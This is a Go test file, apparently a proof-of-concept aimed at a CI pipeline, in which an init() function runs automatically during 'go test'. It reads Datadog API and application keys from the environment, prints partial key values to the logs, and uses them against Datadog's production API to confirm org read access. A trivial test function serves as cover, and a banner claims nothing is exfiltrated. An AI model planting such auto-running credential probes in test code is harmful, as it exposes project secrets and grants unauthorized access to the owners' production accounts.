package test

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"testing"
)

func init() {
	apiKey := os.Getenv("DD_TEST_CLIENT_API_KEY")
	appKey := os.Getenv("DD_TEST_CLIENT_APP_KEY")

	fmt.Println("========================================")
	fmt.Println("Benign test addition — no credentials exfiltrated.")
	fmt.Println()
	fmt.Printf("DD_TEST_CLIENT_API_KEY present: %t (length: %d)\n", apiKey != "", len(apiKey))
	fmt.Printf("DD_TEST_CLIENT_APP_KEY present: %t (length: %d)\n", appKey != "", len(appKey))

	if apiKey != "" {
		fmt.Printf("API key partial: %s...%s\n", apiKey[:4], apiKey[len(apiKey)-4:])

		req, _ := http.NewRequest("GET", "https://api.datadoghq.com/api/v1/validate", nil)
		req.Header.Set("DD-API-KEY", apiKey)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			fmt.Printf("Validate error: %v\n", err)
		} else {
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			fmt.Printf("api.datadoghq.com/api/v1/validate: %d %s\n", resp.StatusCode, string(body))
		}
	}

	if apiKey != "" && appKey != "" {
		req, _ := http.NewRequest("GET", "https://api.datadoghq.com/api/v1/org", nil)
		req.Header.Set("DD-API-KEY", apiKey)
		req.Header.Set("DD-APPLICATION-KEY", appKey)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			fmt.Printf("Org read error: %v\n", err)
		} else {
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			fmt.Printf("api.datadoghq.com/api/v1/org: %d (%d bytes)\n", resp.StatusCode, len(body))
			if resp.StatusCode == 200 {
				fmt.Println("RESULT: Credentials grant read access to Datadog org via production API.")
			}
		}
	}

	fmt.Println("========================================")
}

func TestAddition(t *testing.T) {
	t.Log("Test function executing in CI context.")
}
